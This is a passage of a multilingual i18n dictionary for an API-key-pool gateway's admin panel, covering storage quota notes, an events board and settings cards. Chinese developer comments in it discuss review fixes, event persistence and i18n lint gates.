배포는 isolate당 하루 약 {estimate}회의 KV 읽기가 예상되며, 요청 수가 아니라 새로고침 빈도와 풀 규모에만 좌우됩니다. 실제 총량은 동시에 활성화된 isolate 수만큼 곱해집니다. 자세한 내용은 DEPLOY.md의 할당량 섹션을 참고하세요.\" },\n  \"ov.storageCard.workerNoteUnknown\": { \"zh-CN\": \"本部署的 KV 读写与请求数无关，只取决于刷新频率与池子规模；相关数字暂时读不到，无法给出估算，详见 DEPLOY.md 的配额账小节。\", \"zh-TW\": \"本部署的 KV 讀寫與請求數無關，只取決於重新整理頻率與池子規模；相關數字暫時讀不到，無法給出估算，詳見 DEPLOY.md 的配額帳小節。\", en: \"This deployment's KV reads/writes are independent of request volume — driven only by refresh frequency and pool size. The numbers needed for an estimate are unavailable right now. See the quota section in DEPLOY.md.\", ja: \"このデプロイの KV 読み書きはリクエスト数とは無関係で、更新頻度とプール規模だけで決まります。見積もりに必要な数値が現在取得できません。詳しくは DEPLOY.md の割り当てのセクションを参照してください。\", ko: \"이 배포의 KV 읽기/쓰기는 요청 수와 무관하며 새로고침 빈도와 풀 규모에만 좌우됩니다. 추정에 필요한 수치를 현재 가져올 수 없습니다. 자세한 내용은 DEPLOY.md의 할당량 섹션을 참고하세요.\" },\n  \"ov.storageCard.nodeNote\":  { \"zh-CN\": \"文件存储没有配额限制，但每次写都会重写整个 store.json。\", \"zh-TW\": \"檔案儲存沒有配額限制，但每次寫入都會重寫整個 store.json。\", en: \"File storage has no quota limit, but every write rewrites the entire store.json.\", ja: \"ファイルストレージには割り当て制限はありませんが、書き込みのたびに store.json 全体を書き直します。\", ko: \"파일 스토리지는 할당량 제한이 없지만, 쓸 때마다 store.json 전체를 다시 씁니다.\" },\n\n  // ── 事件板块（Task 6）────────────────────────────────────────────────────\n  \"ev.title\":  { \"zh-CN\": \"事件\", \"zh-TW\": \"事件\", en: \"Events\", ja: \"イベント\", ko: \"이벤트\" },\n  // 顶部常驻说明（两种运行时同一句，见 Task 5 Step 4 的 logs.processLog: false 那条先例）：\n  // Serverless 没有常驻进程，逐请求日志流在这里物理上不可能是完整的。\n  // **评审 I2**：本期只有 config/pool 索引/管理接口/事件落库自身四类运维诊断事件\n  // 会出现在本面板（见 src/core/keypool-repo.ts / config.ts / admin/auth.ts /\n  // adapters/logger-store.ts 的 logger.log() 调用点）。\n  // **评审 I2b（round 3）修正**：round 2 的文案曾错误地说\"注册机（补池）事件还没有\n  // 产出\"——这不属实。`src/core/registrar/{mint,config,tender}.ts` 与\n  // `adapters/mailbox-*.ts` 里有二十多处 `registrar.*` logger.log() 调用点，\n  // 这些事件是真实产出的，只是走的是裸 `ConsoleLogger`（src/http/wire.ts 的\n  // buildTendDeps()，Worker 的 scheduled() 与 fetch() 是两个不同的 isolate\n  // 生命周期，没有请求/响应边界可挂 logFlush，接上去需要 ctx.waitUntil 一类的\n  // 独立落盘机制，留给 P3c 与注册机板块一起做），从未接进 `StoreLogger`，因此\n  // 从不落库、也就从不出现在本面板——\"产出了但没接线\"与\"压根没产出\"是两件不同\n  // 的事，前一版文案把它们混成了一件。key 的冷却/剔除**确实**目前压根不为这两类\n  // 状态变化打事件，这半句评审确认属实，未改动。\n  // ⚠️ P3c Task 7 订正（§0.1 的禁令到这一步才解除，且**改之前跑过一次真机冒烟**：\n  // Node 真进程 + 真存储 + 真跑一轮补池，事件板块里数出 registrar.list_domains_failed ×4 /\n  // registrar.manual_tend_started ×1 / registrar.manual_tend_partial ×1 / config.updated ×1 /\n  // key.added ×2，凭据明文一个字都没有）。上一版说「注册机事件还没接入本面板」——\n  // **那句话从 P3c Task 1 起就不成立了**。同时补两件当时没说的事：面板自己的写操作也进这里；\n  // 事件要等攒批或一个触达间隔才落盘，刚发生的那条最长晚一分钟。\n  // **没变的那一半仍然如实写着**：转发路径自动打的冷却/剔除今天还是不产出事件。\n  \"ev.notice\": {\"zh-CN\": \"这里只有低频结构化事件：配置读取失败、池索引重建、管理接口登录失败这类运维诊断，加上注册机的补池事件与面板自己的写操作（导入 / 停用 / 删除 key、改配置）。**key 被转发路径自动打进冷却或剔除时目前仍然不产出事件**，那一段要看池子里那把 key 自己的状态。事件是攒够一批或隔满一个触达间隔才落盘的，所以刚发生的那条最长要等一分钟才出现在这里。逐请求日志请看容器 stdout / Cloudflare 控制台的 Workers Logs——Serverless 形态没有常驻进程，逐请求日志流在这里物理上不可能是完整的。\", \"zh-TW\": \"這裡只有低頻結構化事件：設定讀取失敗、池索引重建、管理接口登入失敗這類維運診斷，加上註冊機的補池事件與面板自己的寫操作（匯入 / 停用 / 刪除 key、改設定）。**key 被轉發路徑自動打進冷卻或剔除時目前仍然不產出事件**，那一段要看池子裡那把 key 自己的狀態。事件是攢夠一批或隔滿一個觸達間隔才寫入的，所以剛發生的那條最長要等一分鐘才出現在這裡。逐請求日誌請看容器 stdout / Cloudflare 主控台的 Workers Logs——Serverless 形態沒有常駐行程，逐請求日誌流在這裡物理上不可能是完整的。\", en: \"This board shows only low-frequency structured events: operational diagnostics such as config read failures, pool index rebuilds and failed admin logins, plus the registrar's pool-refill events and the panel's own write operations (importing / disabling / deleting keys, changing configuration). **Cooldowns and evictions applied automatically by the forwarding path still produce no events** — for those, look at the state of the key itself in the pool. Events are persisted in batches or once a flush interval has elapsed, so a just-happened event can take up to a minute to appear here. For per-request logs, check container stdout or Cloudflare's Workers Logs — the serverless shape has no long-lived process, so a complete per-request log stream is physically impossible here.\", ja: \"ここには低頻度の構造化イベントのみが表示されます：設定読み込み失敗、プール索引の再構築、管理者ログイン失敗などの運用診断に加え、レジストラーの補充イベントと、パネル自身の書き込み操作（キーのインポート／無効化／削除、設定変更）です。**転送経路が自動で付けたクールダウンや除外は、今のところイベントを出力しません**——その分はプール内のキー自身の状態を見てください。イベントはまとめて、またはフラッシュ間隔が経過してから保存されるため、たった今起きたものがここに現れるまで最大 1 分かかることがあります。リクエストごとのログはコンテナの stdout または Cloudflare コンソールの Workers Logs をご覧ください——サーバーレス形態には常駐プロセスがなく、ここで完全なリクエストごとのログストリームを見ることは物理的に不可能です。\", ko: \"여기에는 저빈도 구조화 이벤트만 표시됩니다: 설정 읽기 실패, 풀 인덱스 재구축, 관리자 로그인 실패 같은 운영 진단에 더해, 등록기의 풀 보충 이벤트와 패널 자신의 쓰기 작업(키 가져오기/정지/삭제, 설정 변경)입니다. **전달 경로가 자동으로 적용한 쿨다운·제외는 아직 이벤트를 생성하지 않습니다** — 그 부분은 풀에 있는 키 자체의 상태를 보세요. 이벤트는 일정량이 모이거나 플러시 간격이 지난 뒤에 저장되므로, 방금 발생한 이벤트가 여기에 나타나기까지 최대 1분이 걸릴 수 있습니다. 요청별 로그는 컨테이너 stdout 또는 Cloudflare 콘솔의 Workers Logs를 확인하세요 — 서버리스 형태에는 상주 프로세스가 없어 여기서 완전한 요청별 로그 스트림을 보는 것은 물리적으로 불가능합니다.\"},\n  \"ev.search\": { \"zh-CN\": \"搜索事件名 / 说明 / 字段…\", \"zh-TW\": \"搜尋事件名 / 說明 / 欄位…\", en: \"Search event / message / fields…\", ja: \"イベント名／説明／フィールドを検索…\", ko: \"이벤트명/설명/필드 검색…\" },\n\n  \"ev.level.all\":   { \"zh-CN\": \"全部级别\", \"zh-TW\": \"全部級別\", en: \"All levels\", ja: \"すべてのレベル\", ko: \"모든 레벨\" },\n  \"ev.level.debug\": { \"zh-CN\": \"调试\", \"zh-TW\": \"偵錯\", en: \"Debug\", ja: \"デバッグ\", ko: \"디버그\" },\n  \"ev.level.info\":  { \"zh-CN\": \"信息\", \"zh-TW\": \"資訊\", en: \"Info\", ja: \"情報\", ko: \"정보\" },\n  \"ev.level.warn\":  { \"zh-CN\": \"警告\", \"zh-TW\": \"警告\", en: \"Warn\", ja: \"警告\", ko: \"경고\" },\n  \"ev.level.error\": { \"zh-CN\": \"错误\", \"zh-TW\": \"錯誤\", en: \"Error\", ja: \"エラー\", ko: \"오류\" },\n  // 评审 I4：一条事件的 level 字段缺失/畸形时，显式归到这一档，不冒充任何已知级别。\n  \"ev.level.unknown\": { \"zh-CN\": \"未知\", \"zh-TW\": \"未知\", en: \"Unknown\", ja: \"不明\", ko: \"알 수 없음\" },\n\n  \"ev.pause\":   { \"zh-CN\": \"暂停\", \"zh-TW\": \"暫停\", en: \"Pause\", ja: \"一時停止\", ko: \"일시 정지\" },\n  \"ev.resume\":  { \"zh-CN\": \"继续\", \"zh-TW\": \"繼續\", en: \"Resume\", ja: \"再開\", ko: \"재개\" },\n  \"ev.clear\":   { \"zh-CN\": \"清空\", \"zh-TW\": \"清空\", en: \"Clear\", ja: \"クリア\", ko: \"지우기\" },\n  \"ev.clearTip\":{ \"zh-CN\": \"只清前端当前显示的列表，不影响服务端已落盘的事件。被清掉的不会自动回来——要重看请点「下载」或刷新页面\", \"zh-TW\": \"只清前端目前顯示的清單，不影響服務端已寫入的事件。被清掉的不會自動回來——要重看請點「下載」或重新整理頁面\", en: \"Clears only the list shown here; events already persisted server-side are unaffected. Cleared entries do not come back on their own — use Download, or reload the page\", ja: \"ここに表示中のリストのみクリアします。サーバー側に保存済みのイベントには影響しません。クリアした分は自動では戻りません——「ダウンロード」を使うか、ページを再読み込みしてください\", ko: \"여기에 표시된 목록만 지웁니다. 서버에 이미 저장된 이벤트에는 영향을 주지 않습니다. 지운 항목은 저절로 돌아오지 않습니다 — 「다운로드」를 쓰거나 페이지를 새로고침하세요\" },\n  \"ev.download\":{ \"zh-CN\": \"下载\", \"zh-TW\": \"下載\", en: \"Download\", ja: \"ダウンロード\", ko: \"다운로드\" },\n  \"ev.downloadFailed\": { \"zh-CN\": \"下载失败\", \"zh-TW\": \"下載失敗\", en: \"Download failed\", ja: \"ダウンロードに失敗しました\", ko: \"다운로드 실패\" },\n  \"ev.autoScroll\": { \"zh-CN\": \"自动滚动\", \"zh-TW\": \"自動捲動\", en: \"Auto-scroll\", ja: \"自動スクロール\", ko: \"자동 스크롤\" },\n\n  \"ev.pollStatus.active\": { \"zh-CN\": \"轮询中\", \"zh-TW\": \"輪詢中\", en: \"Polling\", ja: \"ポーリング中\", ko: \"폴링 중\" },\n  \"ev.pollStatus.paused\": { \"zh-CN\": \"已暂停\", \"zh-TW\": \"已暫停\", en: \"Paused\", ja: \"一時停止中\", ko: \"일시 정지됨\" },\n  \"ev.pollStatus.error\":  { \"zh-CN\": \"轮询出错，稍后重试\", \"zh-TW\": \"輪詢出錯，稍後重試\", en: \"Polling error, will retry\", ja: \"ポーリングエラー、後で再試行します\", ko: \"폴링 오류, 나중에 재시도합니다\" },\n  // 评审 M2：轮询指示灯的提示语接上\"本 isolate\"到底是哪一个（shardId），\n  // 拼在状态文案后面，不是独立一句——避免多语言各自维护一套\"状态+分片\"的组合句。\n  \"ev.pollStatus.shardSuffix\": { \"zh-CN\": \"（本 isolate：{shardId}）\", \"zh-TW\": \"（本 isolate：{shardId}）\", en: \" (this isolate: {shardId})\", ja: \"（この isolate：{shardId}）\", ko: \"(이 isolate: {shardId})\" },\n  // 评审 N1：`buffered` 单独不占用黄条（见 pure/events.mjs 的 shouldWarn 说明），\n  // 但 isolate 随时可能被回收、缓冲里的事件会随之永久丢失——这里补一句 tooltip\n  // 常驻提示，愿意看的人看得到，不打扰不关心的人。\n  \"ev.pollStatus.bufferedSuffix\": { \"zh-CN\": \"（本 isolate 还有 {count} 条事件未落盘，isolate 被回收会丢失）\", \"zh-TW\": \"（本 isolate 還有 {count} 條事件未寫入，isolate 被回收會遺失）\", en: \" ({count} events in this isolate not yet persisted — lost if the isolate is recycled)\", ja: \"（この isolate にはまだ {count} 件のイベントが未保存です。isolate が回収されると失われます）\", ko: \"(이 isolate에 아직 저장되지 않은 이벤트 {count}건이 있습니다. isolate가 회수되면 손실됩니다)\" },\n  // 评审 N1 [LOW]：`generatedAt` 是响应生成时刻，tooltip 报一句\"数据截至几点\"，\n  // 运维不用另外去猜面板有没有卡住（同 pure/keys.mjs 用它当参照时刻的理由）。\n  \"ev.pollStatus.generatedAtSuffix\": { \"zh-CN\": \"（数据截至 {time}）\", \"zh-TW\": \"（資料截至 {time}）\", en: \" (data as of {time})\", ja: \"（データ基準時刻：{time}）\", ko: \"(데이터 기준 시각: {time})\" },\n  // 本任务：`malformed` 恒为 0（`src/` 里没有产出畸形条目的路径），非 0 就说明\n  // 存储被外部写坏过。与 `buffered` 一样只进 tooltip、**不进黄条**——恒为假的\n  // 分支挂在告警判据上没有意义（见 pure/events.mjs 的 shouldWarn 说明）。\n  \"ev.pollStatus.malformedSuffix\": { \"zh-CN\": \"（存储里有 {count} 条畸形事件被丢弃，多半是存储被本网关之外的东西写过）\", \"zh-TW\": \"（儲存裡有 {count} 條畸形事件被丟棄，多半是儲存被本閘道之外的東西寫過）\", en: \" ({count} malformed events in storage were discarded — most likely storage was written by something other than this gateway)\", ja: \"（ストレージ内の不正なイベント {count} 件を破棄しました。本ゲートウェイ以外から書き込まれた可能性が高いです）\", ko: \"(저장소의 잘못된 이벤트 {count}건을 버렸습니다. 이 게이트웨이 외부에서 기록되었을 가능성이 높습니다)\" },\n\n\n  // dropped/budgetExhausted/truncated/cursorAhead 四条黄条文案：**各自独立**，\n  // 由响应对应字段各自驱动，不是同一句话的两种措辞（见 pure/events.mjs 的\n  // shouldWarn 说明）。\n  \"ev.warnDropped\": { \"zh-CN\": \"本 isolate 的事件缓冲已丢弃 {count} 条最旧的事件（环形缓冲上限 100 条，落盘前被新事件顶掉）。\", \"zh-TW\": \"本 isolate 的事件緩衝已丟棄 {count} 條最舊的事件（環形緩衝上限 100 條，寫入前被新事件頂掉）。\", en: \"This isolate's event buffer has dropped {count} of the oldest events (ring buffer caps at 100 entries; new events pushed them out before they were persisted).\", ja: \"この isolate のイベントバッファは最も古い {count} 件のイベントを破棄しました（リングバッファの上限は 100 件で、書き込み前に新しいイベントに押し出されました）。\", ko: \"이 isolate의 이벤트 버퍼가 가장 오래된 이벤트 {count}건을 삭제했습니다(링 버퍼 상한 100건, 저장 전에 새 이벤트에 밀려남).\" },\n  \"ev.warnBudget\":  { \"zh-CN\": \"本 isolate 今天的事件写入预算已用完，未落盘的事件仍在容器日志 / Cloudflare 控制台的 Workers Logs 里。\", \"zh-TW\": \"本 isolate 今天的事件寫入預算已用完，未寫入的事件仍在容器日誌 / Cloudflare 主控台的 Workers Logs 裡。\", en: \"This isolate's event-write budget for today is used up. Events that were not persisted are still available in container logs / Cloudflare's Workers Logs.\", ja: \"この isolate の本日のイベント書き込み予算を使い切りました。書き込まれなかったイベントはコンテナログ／Cloudflare コンソールの Workers Logs に残っています。\", ko: \"이 isolate의 오늘 이벤트 쓰기 예산을 모두 사용했습니다. 저장되지 않은 이벤트는 컨테이너 로그/Cloudflare 콘솔의 Workers Logs에 남아 있습니다.\" },\n  // 评审 I3：after+limit 组合截掉了一部分本该出现的旧事件，必须如实说，不能悄悄吞掉。\n  \"ev.warnTruncated\": { \"zh-CN\": \"这一页没有显示全部符合条件的事件（超出了每次拉取的上限），更早的一部分被截掉了。\", \"zh-TW\": \"這一頁沒有顯示全部符合條件的事件（超出了每次拉取的上限），更早的一部分被截掉了。\", en: \"This page doesn't show every matching event (the per-fetch limit was exceeded); some older ones were cut off.\", ja: \"このページには条件に一致するすべてのイベントが表示されていません（取得件数の上限を超えました）。より古い一部が省略されています。\", ko: \"이 페이지에는 조건에 맞는 모든 이벤트가 표시되지 않습니다(가져오기 상한 초과). 더 오래된 일부가 잘렸습니다.\" },\n  // 评审 C6：游标领先于本次请求的时钟（时钟回拨 / isolate 间时钟偏移），空结果\n  // 不代表没有新事件。前端已经自动把冻结的游标丢掉重新冷读（见 sec-events.js 的\n  // poll()），这条只是如实告诉运维\"刚刚发生过一次自动恢复\"，不需要手动操作。\n  // 评审 I6：后端吐的 `cursor` 既不是有限数字也不是 null ⇒ **后端契约当场被破坏**。\n  // **上黄条**（不是只进 tooltip）：它意味着游标推不动、面板可能永远看不到新事件，\n  // 而旁边那条会自愈的 `cursorAhead` 反倒在判据里。一个悬停才看得见的提示，\n  // 把「面板在撒谎」降级成了「面板在小声说」。\n  \"ev.warnCursorBroken\": { \"zh-CN\": \"接口返回的游标不合契约（既不是数字也不是空），面板可能一直看不到新事件。已保留上一个游标；请检查事件存储是否被本网关之外的东西写过。\", \"zh-TW\": \"介面回傳的游標不合契約（既不是數字也不是空），面板可能一直看不到新事件。已保留上一個游標；請檢查事件儲存是否被本閘道之外的東西寫過。\", en: \"The cursor returned by the API violates the contract (neither a number nor null); the board may never show new events. The previous cursor was kept — check whether the event storage was written by something other than this gateway.\", ja: \"API が返したカーソルが契約に反しています（数値でも null でもありません）。ボードに新しいイベントが今後まったく表示されない可能性があります。直前のカーソルを保持しました。イベントストレージが本ゲートウェイ以外から書き込まれていないか確認してください。\", ko: \"API가 반환한 커서가 계약을 위반했습니다(숫자도 null도 아님). 보드에 새 이벤트가 계속 표시되지 않을 수 있습니다. 이전 커서를 유지했으니, 이벤트 저장소가 이 게이트웨이 외부에서 기록되지 않았는지 확인하세요.\", },\n  \"ev.warnCursorAhead\": { \"zh-CN\": \"检测到游标领先于服务端时钟（可能是时钟回拨或 isolate 间时钟偏移），已自动重新拉取最新数据。\", \"zh-TW\": \"偵測到游標領先於服務端時鐘（可能是時鐘回撥或 isolate 間時鐘偏移），已自動重新擷取最新資料。\", en: \"Detected a cursor ahead of the server clock (possibly a clock rollback or skew between isolates); automatically re-fetched from a fresh cursor.\", ja: \"カーソルがサーバー時刻より先行していることを検出しました（時刻の巻き戻し、または isolate 間の時刻ずれの可能性）。自動的に新しいカーソルから再取得しました。\", ko: \"커서가 서버 시계보다 앞서 있는 것을 감지했습니다(시계 롤백 또는 isolate 간 시계 편차 가능성). 새 커서로 자동으로 다시 가져왔습니다.\" },\n\n  \"ev.empty\":   { \"zh-CN\": \"还没有事件。\", \"zh-TW\": \"還沒有事件。\", en: \"No events yet.\", ja: \"まだイベントはありません。\", ko: \"아직 이벤트가 없습니다.\" },\n  // 全分支评审 I5：点过「清空」之后**不许**再显示 ev.empty ——那是在对运维说\n  // \"这个部署从来没出过事\"，而服务端明明有事件。这一句同时说清恢复路径。\n  \"ev.cleared\": { \"zh-CN\": \"已清空本页显示。服务端已落盘的事件不受影响——点「下载」可取到全部，或刷新页面重新拉取。\", \"zh-TW\": \"已清空本頁顯示。服務端已寫入的事件不受影響——點「下載」可取得全部，或重新整理頁面重新拉取。\", en: \"Cleared the list shown here. Events already persisted server-side are unaffected — use Download to get them all, or reload the page to fetch them again.\", ja: \"このページの表示をクリアしました。サーバー側に保存済みのイベントには影響しません——「ダウンロード」で全件取得できます。ページを再読み込みすれば再取得されます。\", ko: \"이 페이지의 표시를 지웠습니다. 서버에 이미 저장된 이벤트에는 영향이 없습니다 — 「다운로드」로 전부 받을 수 있고, 페이지를 새로고침하면 다시 불러옵니다.\" },\n  \"ev.noMatch\": { \"zh-CN\": \"没有符合筛选条件的事件。\", \"zh-TW\": \"沒有符合篩選條件的事件。\", en: \"No events match the current filters.\", ja: \"現在のフィルター条件に一致するイベントはありません。\", ko: \"현재 필터 조건에 맞는 이벤트가 없습니다.\" },\n\n  \"ev.col.time\":   { \"zh-CN\": \"时间\", \"zh-TW\": \"時間\", en: \"Time\", ja: \"時刻\", ko: \"시각\" },\n  \"ev.col.level\":  { \"zh-CN\": \"级别\", \"zh-TW\": \"級別\", en: \"Level\", ja: \"レベル\", ko: \"레벨\" },\n  \"ev.col.event\":  { \"zh-CN\": \"事件\", \"zh-TW\": \"事件\", en: \"Event\", ja: \"イベント\", ko: \"이벤트\" },\n  \"ev.col.detail\": { \"zh-CN\": \"说明 / 字段\", \"zh-TW\": \"說明 / 欄位\", en: \"Message / fields\", ja: \"説明／フィールド\", ko: \"설명/필드\" },\n\n  // 分组时间线的组头文案（P-1：按 corr 相邻折叠）。\n  \"ev.timeline\": { \"zh-CN\": \"时间线 · {count} 条 · {corr}\", \"zh-TW\": \"時間線 · {count} 條 · {corr}\", en: \"Timeline · {count} events · {corr}\", ja: \"タイムライン · {count} 件 · {corr}\", ko: \"타임라인 · {count}건 · {corr}\" },\n\n  // ── 设置页（P3c Task 7，设计 §10.4 的前三张卡）────────────────────────────\n  //\n  // ⚠️ **命名空间刻意用 `set.*` 而不是 `reg.*`**，两条理由：\n  // ① `reg.*` 是禁用词门禁（`scripts/check-i18n.mjs` 第 ⑥ 条）的作用域，而那道门禁\n  //    管的是「两条邮箱通道有没有被暗示成有高下」；设置页里绝大多数文案（超时、\n  //    冷却、口令）与通道毫无关系，塞进 `reg.*` 只会让那道门禁的作用域失焦。\n  // ② **真正与通道有关的那几处，本任务用的是结构性做法而不是词表**：两条通道的\n  //    凭据字段**共用同一对 key**（`set.field.channel.baseUrl` / `…apiKey`），\n  //    通道名与地址事实那两句仍然走 `reg.channel.*`（在门禁作用域内）。\n  //    共用一对 key 比词表强：想给某一条通道多写半句话，得先造出第二个 key，\n  //    而那一步在评审里看得见。\n  //\n  // ⚠️⚠️ **`set.field.*` 这一整族对三道 i18n 门禁是隐身的**：`fieldLabelKey()`\n  // 返回的是**模板字面量** `` `set.field.${path}` ``，而三道门禁只认\n  // data-i18n 属性与字面的翻译函数调用两种形态（`reg.fail.*` 那一族因为在 switch 里\n  // 直接 return 字面量，已经踩过同一个坑，见 P3c Task 6 报告 §2.4）。\n  // ⚠️ 这段说明**刻意不把那两种形态写成代码片段**：门禁第 ① 条不去注释，\n  // 注释里写一个长得像调用点的片段会被它当成一次真实引用（本任务实测踩过一次，\n  // 当时报的是「引用了字典里没有的 key」）。\n  // ⇒ **补一道自己的**：`tests/ui/settings.test.ts` 的\n  // 「后端 EDITABLE_FIELDS 的每条路径都有一条 set.field.* 文案」从后端那份\n  // 编译期强制的清单出发反查字典，加字段不补文案当场红。\n  \"set.title\": { \"zh-CN\": \"设置\", \"zh-TW\": \"設定\", en: \"Settings\", ja: \"設定\", ko: \"설정\" },\n  \"set.save\": { \"zh-CN\": \"保存\", \"zh-TW\": \"儲存\", en: \"Save\", ja: \"保存\", ko: \"저장\" },\n  \"set.card.auth\": { \"zh-CN\": \"认证密钥\", \"zh-TW\": \"認證密鑰\", en: \"Credentials\", ja: \"認証キー\", ko: \"인증 키\" },\n  \"set.card.upstream\": { \"zh-CN\": \"上游与冷却\", \"zh-TW\": \"上游與冷卻\", en: \"Upstream & cooldowns\", ja: \"上流とクールダウン\", ko: \"업스트림 및 쿨다운\" },\n  \"set.card.registrar\": { \"zh-CN\": \"注册机\", \"zh-TW\": \"註冊機\", en: \"Registrar\", ja: \"レジストラー\", ko: \"등록기\" },\n  // ── 第 4 张卡：集成示例（P3d Task 7，设计 §10.4）────────────────────────────\n  // ⚠️ **这几条里一个地址字面量都不许出现。** 示例里的 base URL 只能在运行期从\n  // 面板自己的 origin 取（`admin-ui/js/sec-settings.js` 读一次再传给纯函数），\n  // 写死任何一个都是错的；占位口令走 `{key}` 插值，取值是\n  // `admin-ui/js/pure/examples.mjs` 的 `KEY_PLACEHOLDER`，字典里不再抄一份。\n  \"set.card.examples\": { \"zh-CN\": \"集成示例\", \"zh-TW\": \"整合範例\", en: \"Integration examples\", ja: \"統合サンプル\", ko: \"통합 예제\" },\n  \"set.examples.desc\": { \"zh-CN\": \"下面的示例由本网关自己的协议目录生成，地址取自你现在访问面板用的那个域名。把 {key} 换成你的网关口令再执行——面板读不到明文口令，这里只能给占位符。\", \"zh-TW\": \"下面的範例由本網關自己的協議目錄產生，位址取自你現在存取面板用的那個網域。把 {key} 換成你的網關口令再執行——面板讀不到明文口令，這裡只能給佔位符。\", en: \"These snippets are generated from this gateway's own protocol catalog, and the base address is the origin you are viewing this panel on. Replace {key} with your gateway token before running them — the panel cannot read the token in clear text, so only a placeholder is shown here.\", ja: \"以下のサンプルはこのゲートウェイ自身のプロトコルカタログから生成され、基準アドレスは今このパネルを開いているオリジンです。実行する前に {key} をご自身のゲートウェイトークンに置き換えてください。パネルはトークンの平文を読めないため、ここではプレースホルダーのみを表示します。\", ko: \"아래 예제는 이 게이트웨이 자체의 프로토콜 카탈로그에서 생성되며, 기준 주소는 지금 이 패널을 열고 있는 오리진입니다. 실행하기 전에 {key}를 본인의 게이트웨이 토큰으로 바꾸세요. 패널은 토큰 평문을 읽을 수 없으므로 여기에는 자리표시자만 표시합니다.\" },\n  \"set.examples.proto\": { \"zh-CN\": \"协议\", \"zh-TW\": \"協議\", en: \"Protocol\", ja: \"プロトコル\", ko: \"프로토콜\" },\n  \"set.examples.lang\": { \"zh-CN\": \"语言\", \"zh-TW\": \"語言\", en: \"Language\", ja: \"言語\", ko: \"언어\" },\n  \"set.examples.noModel\": { \"zh-CN\": \"这条协议上没有可用的模型，因此没有可以照抄的示例。\", \"zh-TW\": \"這條協議上沒有可用的模型，因此沒有可以照抄的範例。\", en: \"No model is available on this protocol, so there is no example to copy.\", ja: \"このプロトコルで使えるモデルがないため、コピーできるサンプルはありません。\", ko: \"이 프로토콜에서 쓸 수 있는 모델이 없어 복사할 예제가 없습니다.\" },\n  \"set.examples.unavailable\": { \"zh-CN\": \"协议目录读不出来，这里不猜一段示例给你看。\", \"zh-TW\": \"協議目錄讀不出來，這裡不猜一段範例給你看。\", en: \"The protocol catalog could not be read, and no example is guessed here.\", ja: \"プロトコルカタログを取得できませんでした。ここで推測したサンプルは出しません。\", ko: \"프로토콜 카탈로그를 읽지 못했습니다. 여기서 추측한 예제는 보여 주지 않습니다.\" },\n  \"set.card.upstreamNote\": { \"zh-CN\": \"池快照缓存与写消除间隔是建实例时读一次的：改了要重启容器 / 等 isolate 回收才生效，不是下一个请求就变。\", \"zh-TW\": \"池快照快取與寫入消除間隔是建立實例時讀一次的：改了要重啟容器 / 等 isolate 回收才生效，不是下一個請求就變。\", en: \"The pool snapshot cache and the write-elision interval are read once when the instance is built: changing them takes effect after a container restart or isolate recycle, not on the next request.\", ja: \"プールスナップショットのキャッシュと書き込み省略の間隔は、インスタンス構築時に一度だけ読まれます。変更は次のリクエストではなく、コンテナ再起動または isolate の再生成後に反映されます。\", ko: \"풀 스냅숏 캐시와 쓰기 생략 간격은 인스턴스를 만들 때 한 번만 읽습니다. 변경은 다음 요청이 아니라 컨테이너 재시작 또는 isolate 회수 이후에 반영됩니다.\" },\n  \"set.adminTokenNote\": { \"zh-CN\": \"管理口令（ADMIN_TOKEN）只从环境变量读，面板改不了自己的钥匙；要轮换请改部署那一侧的环境变量并重启。\", \"zh-TW\": \"管理口令（ADMIN_TOKEN）只從環境變數讀，面板改不了自己的鑰匙；要輪換請改部署那一側的環境變數並重啟。\", en: \"The admin token (ADMIN_TOKEN) is read from the environment only — the panel cannot change its own key. To rotate it, change the environment variable on the deployment side and restart.\", ja: \"管理トークン（ADMIN_TOKEN）は環境変数からのみ読み込まれ、パネルが自分の鍵を変更することはできません。ローテーションするにはデプロイ側の環境変数を変更して再起動してください。\", ko: \"관리 토큰(ADMIN_TOKEN)은 환경 변수에서만 읽으며, 패널이 자신의 키를 바꿀 수는 없습니다. 교체하려면 배포 쪽 환경 변수를 바꾸고 재시작하세요.\" },\n  \"set.secretPlaceholder\": { \"zh-CN\": \"留空则不修改\", \"zh-TW\": \"留空則不修改\", en: \"Leave blank to keep unchanged\", ja: \"空欄のままにすると変更されません\", ko: \"비워 두면 변경되지 않습니다\" },\n  \"set.secretSet\": { \"zh-CN\": \"已配置\", \"zh-TW\": \"已設定\", en: \"configured\", ja: \"設定済み\", ko: \"설정됨\" },\n  \"set.secretUnset\": { \"zh-CN\": \"未配置\", \"zh-TW\": \"未設定\", en: \"not configured\", ja: \"未設定\", ko: \"설정 안 됨\" },\n  \"set.clearSecret\": { \"zh-CN\": \"清空\", \"zh-TW\": \"清空\", en: \"Clear\", ja: \"クリア\", ko: \"지우기\" },\n  \"set.meta.secret\": { \"zh-CN\": \"{state} · 末 4 位 {hint}\", \"zh-TW\": \"{state} · 末 4 位 {hint}\", en: \"{state} · last 4: {hint}\", ja: \"{state} · 末尾 4 桁 {hint}\", ko: \"{state} · 마지막 4자리 {hint}\" },\n  \"set.meta.quad\": { \"zh-CN\": \"存储 {stored} · 环境变量 {env} · 生效 {effective}\", \"zh-TW\": \"儲存 {stored} · 環境變數 {env} · 生效 {effective}\", en: \"stored {stored} · env {env} · effective {effective}\", ja: \"保存値 {stored} · 環境変数 {env} · 実効値 {effective}\", ko: \"저장값 {stored} · 환경 변수 {env} · 실효값 {effective}\" },\n  \"set.meta.unreadable\": { \"zh-CN\": \"这一格没读到\", \"zh-TW\": \"這一格沒讀到\", en: \"Could not read this field\", ja: \"この項目は取得できませんでした\", ko: \"이 항목을 읽지 못했습니다\" },\n  \"set.lockedBy\": { \"zh-CN\": \"由环境变量 {env} 锁定，面板改了不会生效；要改请改部署那一侧的 {env} 并重启。\", \"zh-TW\": \"由環境變數 {env} 鎖定，面板改了不會生效；要改請改部署那一側的 {env} 並重啟。\", en: \"Locked by the environment variable {env}; editing it here has no effect. Change {env} on the deployment side and restart.\", ja: \"環境変数 {env} によりロックされています。ここで編集しても反映されません。デプロイ側の {env} を変更して再起動してください。\", ko: \"환경 변수 {env}로 잠겨 있어 여기서 수정해도 반영되지 않습니다. 배포 쪽 {env}를 바꾸고 재시작하세요.\" },\n  \"set.propagation\": { \"zh-CN\": \"本实例已经生效；别的副本 / isolate 最长 {bound} 之后才看得到这次改动。\", \"zh-TW\": \"本實例已經生效；別的副本 / isolate 最長 {bound} 之後才看得到這次改動。\", en: \"This instance already picked it up; other replicas/isolates may take up to {bound} to see the change.\", ja: \"このインスタンスには既に反映されています。他のレプリカ／isolate には最大 {bound} かかります。\", ko: \"이 인스턴스에는 이미 반영되었습니다. 다른 복제본/isolate는 최대 {bound} 걸릴 수 